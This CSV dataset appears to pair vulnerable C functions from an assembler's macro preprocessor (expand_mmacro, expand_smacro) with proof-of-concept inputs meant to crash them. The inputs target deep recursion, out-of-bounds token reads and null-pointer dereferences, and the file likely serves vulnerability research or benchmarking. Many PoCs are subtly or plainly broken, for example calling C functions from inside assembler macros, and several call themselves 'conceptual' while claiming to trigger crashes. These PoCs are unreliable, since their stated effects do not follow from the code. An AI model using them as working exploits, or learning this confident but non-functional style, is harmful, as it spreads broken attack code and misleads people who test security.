Vulnerable Code,PoC Exploit Code,Vul_Index
,"%macro create_deep_expr 1
    %assign i 0
    %rep %1
        %if i == 0
            struc expr_item
                .type resb 1
                .data resb 8  ; Assuming 64-bit pointers
            endstruc

            %define expr_base (expr_item.type)
            %define expr_data (expr_item.data)

            ;; Initialize base expression
            db YASM_EXPR_EXPR  ; Expression type
            dq expr_base       ; Point to itself to create a loop
        %else
            ;; Each iteration points to the previous expression, deepening the recursion
            db YASM_EXPR_EXPR
            dq expr_base - (i * expr_item_size)
        %endif
        %assign i i+1
    %endrep
%endmacro

section .data
    create_deep_expr 1000  ; Adjust the depth to trigger the overflow

section .text
    ;; Assuming yasm_expr_copy is callable and the addresses are known
    ;; This is a conceptual call, actual addresses and calling convention must be adapted
    extern yasm_expr_copy
    lea rdi, [expr_base]  ; Destination
    lea rsi, [expr_base]  ; Source (deeply nested expression)
    call yasm_expr_copy",vul27_7
,"%macro recursive_expr 1
    %if %1 > 0
        %assign next_level %1-1
        recursive_expr next_level
    %else
        %error ""Triggering deep recursion""
    %endif
%endmacro

%macro exploit 0
    recursive_expr 1000  ; Adjust the depth to ensure it's sufficient to cause a stack overflow
%endmacro

exploit",vul27_8
"static int expand_mmacro(Token * tline) { Token *startline = tline; Token *label = NULL; int dont_prepend = 0; Token **params, *t, *tt; MMacro *m; Line *l, *ll; int i, nparam; long *paramlen; t = tline; skip_white_(t); if (!tok_type_(t, TOK_ID) && !tok_type_(t, TOK_PREPROC_ID)) return 0; m = is_mmacro(t, &params); if (!m) { Token *last; label = last = t; t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; if (tok_is_(t, \"":\"")) { dont_prepend = 1; last = t, t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; } if (!tok_type_(t, TOK_ID) || (m = is_mmacro(t, &params)) == NULL) return 0; last->next = NULL; tline = t; } for (nparam = 0; params[nparam]; nparam++) ; paramlen = nparam ? nasm_malloc(nparam * sizeof(*paramlen)) : NULL; for (i = 0; params[i]; i++) { int brace = FALSE; int comma = (!m->plus || i < nparam - 1); t = params[i]; skip_white_(t); if (tok_is_(t, \""{\"")) t = t->next, brace = TRUE, comma = FALSE; params[i] = t; paramlen[i] = 0; while (t) { if (comma && t->type == TOK_OTHER && !strcmp(t->text, \"",\"")) break; if (comma && t->type == TOK_WHITESPACE && tok_is_(t->next, \"",\"")) break; if (brace && t->type == TOK_OTHER && !strcmp(t->text, \""}\"")) break; t = t->next; paramlen[i]++; } } ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = m; ll->first = NULL; istk->expansion = ll; m->in_progress = TRUE; m->params = params; m->iline = tline; m->nparam = nparam; m->rotate = 0; m->paramlen = paramlen; m->unique = unique++; m->lineno = 0; m->next_active = istk->mstk; istk->mstk = m; for (l = m->expansion; l; l = l->next) { Token **tail; ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; tail = &ll->first; for (t = l->first; t; t = t->next) { Token *x = t; if (t->type == TOK_PREPROC_ID && t->text[1] == '0' && t->text[2] == '0') { dont_prepend = -1; x = label; if (!x) continue; } tt = *tail = new_Token(NULL, x->type, x->text, 0); tail = &tt->next; } *tail = NULL; } if (label) { if (dont_prepend < 0) free_tlist(startline); else { ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; ll->first = startline; if (!dont_prepend) { while (label->next) label = label->next; label->next = tt = new_Token(NULL, TOK_OTHER, \"":\"", 0); } } } list->uplevel(m->nolist ? LIST_MACRO_NOLIST : LIST_MACRO); return 1; }","%macro trigger_preproc_id_mismatch 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
    %assign %$mstk NULL
    %assign %$expansion NULL
    %assign %$params NULL
    expand_mmacro %$token  ; Call the vulnerable function with the crafted token
%endmacro

trigger_preproc_id_mismatch",vul28_1
,"%macro crash_expand_mmacro 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
    %assign %$tline %$token
    %strcat %$tline.next NULL  ; Simulate end of token list
    expand_mmacro(%$tline)  ; Call the vulnerable function with the crafted token
%endmacro

crash_expand_mmacro",vul28_2
,"%macro crash_yasm 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)
    %assign %$t %$token
    %rep 1
        expand_mmacro(%$t)
    %endrep
%endmacro

crash_yasm",vul28_3
,"%macro crash_expand_mmacro 0
    %define %$tline `new_Token(NULL, TOK_PREPROC_ID, ""00"", 0)`
    %assign %$dont_prepend 0
    %assign %$label NULL
    %assign %$params NULL
    %assign %$t %$tline
    %assign %$tt NULL
    %assign %$m NULL
    %assign %$l NULL
    %assign %$ll NULL
    %assign %$i 0
    %assign %$nparam 0
    %assign %$paramlen NULL

    ; Simulate the function call with controlled parameters
    %xdefine expand_mmacro(%$tline)
%endmacro

crash_expand_mmacro",vul28_4
,"%macro trigger_preproc_token_type_mismatch 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
    %assign %$t %$token
    %ifidn %$t.type, TOK_PREPROC_ID
        %error ""Triggering memory corruption""
    %endif
%endmacro

trigger_preproc_token_type_mismatch",vul28_5
,"%macro crash_expand_mmacro 0
    %define %$tline `new_Token(NULL, TOK_PREPROC_ID, ""00trigger"", 0)`
    %assign %$params NULL
    %assign %$m NULL
    %assign %$istk NULL
    %assign %$label NULL
    %assign %$dont_prepend 0

    ; Simulate the environment to trigger the specific condition
    ; This token setup is crafted to pass initial checks and reach the vulnerable code block
    %define %$t %$tline
    %define %$t.next NULL
    %define %$t.type TOK_PREPROC_ID
    %define %$t.text ""00trigger""

    ; Force the function to use these crafted tokens and parameters
    expand_mmacro(%$tline)
%endmacro

crash_expand_mmacro",vul28_6
,"%macro crash_expand_mmacro 0
    %struc TOK_PREPROC_ID
        .type resb 1
        .text resb 1  ; Allocate only 1 byte for text, insufficient for the check in the function
    %endstruc

    %assign %$t new TOK_PREPROC_ID
    %$t.type db 0x01  ; Set type to TOK_PREPROC_ID
    %$t.text db 0x00  ; Only one byte, insufficient for '00' check

    %define %$token_list %$t

    ; Simulate calling expand_mmacro with the crafted token
    expand_mmacro %$token_list
%endmacro

crash_expand_mmacro",vul28_7
,"%macro trigger_preproc_id_mismatch 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with text ""0""
    %assign %$t %$token
    %ifid %$t
        %error ""This should not happen if memory safety is enforced.""
    %endif
%endmacro

trigger_preproc_id_mismatch",vul28_8
,"%macro trigger_preproc_token_type_mismatch 0
    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
    %assign %$t %$token
    %ifidn %$t.type, TOK_PREPROC_ID
        %error ""Attempting to access out-of-bounds memory""
    %endif
%endmacro

trigger_preproc_token_type_mismatch",vul28_9
,"%macro crash_expand_mmacro 0
    ;; Create a token that simulates a TOK_PREPROC_ID with a short text field
    %define %$t new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)
    
    ;; Force the expand_mmacro function to process this token
    ;; This should access t->text[1] and t->text[2], leading to out-of-bounds access
    %assign %$result expand_mmacro(%$t)
%endmacro

crash_expand_mmacro",vul28_10
"expand_smacro(Token * tline) { Token *t, *tt, *mstart, **tail, *thead; SMacro *head = NULL, *m; Token **params; int *paramsize; int nparam, sparam, brackets, rescan; Token *org_tline = tline; Context *ctx; char *mname; if (org_tline) { tline = new_Token(org_tline->next, org_tline->type, org_tline->text, 0); tline->mac = org_tline->mac; nasm_free(org_tline->text); org_tline->text = NULL; } again: tail = &thead; thead = NULL; while (tline) { if ((mname = tline->text)) { if (tline->type == TOK_ID || tline->type == TOK_PREPROC_ID) ctx = get_ctx(mname, TRUE); else ctx = NULL; if (!ctx) head = smacros[hash(mname)]; else head = ctx->localmac; for (m = head; m; m = m->next) if (!mstrcmp(m->name, mname, m->casesense)) break; if (m) { mstart = tline; params = NULL; paramsize = NULL; if (m->nparam == 0) { if (!m->expansion) { if (!strcmp(\""__FILE__\"", m->name)) { long num = 0; nasm_src_get(&num, &(tline->text)); nasm_quote(&(tline->text)); tline->type = TOK_STRING; continue; } if (!strcmp(\""__LINE__\"", m->name)) { nasm_free(tline->text); make_tok_num(tline, yasm_intnum_create_int(nasm_src_get_linnum())); continue; } tline = delete_Token(tline); continue; } } else { do { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; } while (tok_type_(tline, TOK_WHITESPACE)); if (!tok_is_(tline, \""(\"")) { tline = mstart; m = NULL; } else { int paren = 0; int white = 0; brackets = 0; nparam = 0; sparam = PARAM_DELTA; params = nasm_malloc(sparam * sizeof(Token *)); params[0] = tline->next; paramsize = nasm_malloc(sparam * sizeof(int)); paramsize[0] = 0; while (TRUE) { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; if (!tline) { error(ERR_NONFATAL, \""macro call expects terminating `)'\""); break; } if (tline->type == TOK_WHITESPACE && brackets <= 0) { if (paramsize[nparam]) white++; else params[nparam] = tline->next; continue; } if (tline->type == TOK_OTHER && tline->text[1] == 0) { char ch = tline->text[0]; if (ch == ',' && !paren && brackets <= 0) { if (++nparam >= sparam) { sparam += PARAM_DELTA; params = nasm_realloc(params, sparam * sizeof(Token *)); paramsize = nasm_realloc(paramsize, sparam * sizeof(int)); } params[nparam] = tline->next; paramsize[nparam] = 0; white = 0; continue; } if (ch == '{' && (brackets > 0 || (brackets == 0 && !paramsize[nparam]))) { if (!(brackets++)) { params[nparam] = tline->next; continue; } } if (ch == '}' && brackets > 0) if (--brackets == 0) { brackets = -1; continue; } if (ch == '(' && !brackets) paren++; if (ch == ')' && brackets <= 0) if (--paren < 0) break; } if (brackets < 0) { brackets = 0; error(ERR_NONFATAL, \""braces do not enclose all of macro parameter\""); } paramsize[nparam] += white + 1; white = 0; } nparam++; while (m && (m->nparam != nparam || mstrcmp(m->name, mname, m->casesense))) m = m->next; if (!m) error(ERR_WARNING | ERR_WARN_MNP, \""macro `%s' exists, but not taking %d parameters\"", mstart->text, nparam); } } if (m && m->in_progress) m = NULL; if (!m) nasm_free(params); nasm_free(paramsize); tline = mstart; } else { t = tline; if (t) { tline = t->next; t->next = NULL; } tt = new_Token(tline, TOK_SMAC_END, NULL, 0); tt->mac = m; m->in_progress = TRUE; tline = tt; for (t = m->expansion; t; t = t->next) { if (t->type >= TOK_SMAC_PARAM) { Token *pcopy = tline, **ptail = &pcopy; Token *ttt, *pt; int i; ttt = params[t->type - TOK_SMAC_PARAM]; for (i = paramsize[t->type - TOK_SMAC_PARAM]; --i >= 0;) { pt = *ptail = new_Token(tline, ttt->type, ttt->text, 0); ptail = &pt->next; ttt = ttt->next; } tline = pcopy; } else { tt = new_Token(tline, t->type, t->text, 0); tline = tt; } } nasm_free(params); nasm_free(paramsize); free_tlist(mstart); continue; } } } if (tline->type == TOK_SMAC_END) { tline->mac->in_progress = FALSE; tline = delete_Token(tline); } else { t = *tail = tline; tline = tline->next; t->mac = NULL; t->next = NULL; tail = &t->next; } } t = thead; rescan = 0; while (t) { while (t && t->type != TOK_ID && t->type != TOK_PREPROC_ID) t = t->next; if (!t || !t->next) break; if (t->next->type == TOK_ID || t->next->type == TOK_PREPROC_ID || t->next->type == TOK_NUMBER) { char *p = nasm_strcat(t->text, t->next->text); nasm_free(t->text); t->next = delete_Token(t->next); t->text = p; rescan = 1; } else if (t->next->type == TOK_WHITESPACE && t->next->next && t->next->next->type == TOK_PREPROC_ID && strcmp(t->next->next->text, \""%+\"") == 0) { int i; for (i = 1; i <= 3; i++) { if (!t->next || (i != 2 && t->next->type != TOK_WHITESPACE)) break; t->next = delete_Token(t->next); } } else t = t->next; } if (rescan) { tline = thead; goto again; } if (org_tline) { if (thead) { *org_tline = *thead; thead->text = NULL; delete_Token(thead); } else { memset(org_tline, 0, sizeof(*org_tline)); org_tline->text = NULL; org_tline->type = TOK_WHITESPACE; } thead = org_tline; } return thead; }","%macro crash_macro 0
    %rep 1
        %assign %$i 0
        %rep 1
            %ifidn __FILE__, __FILE__
                %rotate 1
                %exitrep
            %endif
        %endrep
    %endrep
%endmacro

%macro trigger_crash 0
    crash_macro
    %rep 1
        %ifidn __FILE__, __FILE__
            %rotate 1
            %exitrep
        %endif
    %endrep
%endmacro

trigger_crash",vul29_1
,"%macro trigger_expand_smacro_error 0
    %define TOK_ID 1
    %define TOK_PREPROC_ID 2
    %define TOK_WHITESPACE 3
    %define TOK_OTHER 4
    %define TOK_STRING 5
    %define TOK_NUMBER 6

    %struc fake_token
        .type resb 1
        .text resb 8
        .mac resb 8
    %endstruc

    %struc fake_smacro
        .in_progress resb 1
    %endstruc

    ;; Create a fake token that simulates a macro call
    %assign %$token fake_token
    %assign %$smacro fake_smacro

    ;; Incorrectly set up the token to point to a macro structure
    [SECTION .data]
    token_instance:    resb fake_token_size
    smacro_instance:   resb fake_smacro_size

    ;; Simulate a macro in progress
    mov byte [smacro_instance+fake_smacro.in_progress], 1

    ;; Point the token's mac field to our fake macro
    mov rax, smacro_instance
    mov [token_instance+fake_token.mac], rax

    ;; Set the token type to simulate a macro end (this should not be a valid scenario)
    mov byte [token_instance+fake_token.type], TOK_ID  ; Simulate an identifier token

    ;; Trigger the function with the crafted token
    ;; This should access t->mac->in_progress where t is our crafted token
    ;; The goal is to cause a segmentation fault due to invalid memory access
%endmacro

trigger_expand_smacro_error",vul29_2
,"%macro trigger_null_pointer 0
    ; Simulate a scenario where t->mac might be NULL
    ; This is a conceptual representation and may not directly correspond to actual memory manipulation in YASM
    %define t.mac NULL
    %assign t.type TOK_SMAC_END
    %rep 1
        ; Force the execution path to hit the vulnerable line
        mov ebx, [t.mac]  ; ebx is used hypothetically to represent accessing t->mac
        mov [ebx], FALSE  ; This represents t->mac->in_progress = FALSE
    %endrep
%endmacro

trigger_null_pointer",vul29_3
,"%macro crash_macro 0
    %rep 1
        %assign %$i 0
        %rep 1
            %ifidn __FILE__, __FILE__
                %rotate 1
                %exitrep
            %endif
        %endrep
    %endrep
%endmacro

crash_macro",vul29_4
